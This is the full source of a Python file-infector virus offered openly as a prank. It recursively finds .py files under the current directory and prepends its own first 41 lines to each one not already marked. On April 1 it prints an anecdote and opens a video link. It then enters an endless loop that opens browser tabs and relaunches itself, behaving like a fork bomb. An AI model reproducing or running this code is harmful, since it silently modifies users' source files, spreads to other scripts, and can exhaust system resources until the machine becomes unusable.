import os, datetime, inspect, webbrowser, pathlib, os
DATA_TO_INSERT = "#spaghetti is dope as hell"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path+"/"+filename):
            filestoinfect.extend(search(path+"/"+filename))
        elif filename[-3:] == ".py":
            infected = False
            for line in open(path+"/"+filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                 filestoinfect.append(path+"/"+filename)
    return filestoinfect
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
         f = open(fname)
         temp = f.read()
         f.close()
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
def explode():
      if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
             print ("For generations, the indigenous peoples of South American used blow darts laced with paralytic plant extract to hunt their prey. In the 1800s, English physicians who interacted with these indigenous South Americans recognized the possible uses of this paralytic agent, now known as tubocurarine, as an anesthetic agent for surgeries. Physicians noticed that animals under the influence of tubocurarine would become temporarily immobilized but would recover after a period of paralysis. According to these physicians, this discovery would revolutionize surgery as an anesthetic agent. So confident were they in their discovery that one of the physicians volunteered to undergo surgery under the influence of tubocurarine to demonstrate its effectiveness. Unfortunately, he failed to realize that, although the drug was an effective paralyzing agent, it did not have any effect on the sensory receptors of the body, so he felt every cut of the surgery without being able to move or do anything about it.")
             webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
def getfucked():

    eatFood = pathlib.Path().absolute()
    while True:
        webbrowser.open("https://www.youtube.com/watch?v=1yOWszgwejs")
        os.system(f'python3 {__file__}')

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
explode()
getfucked()
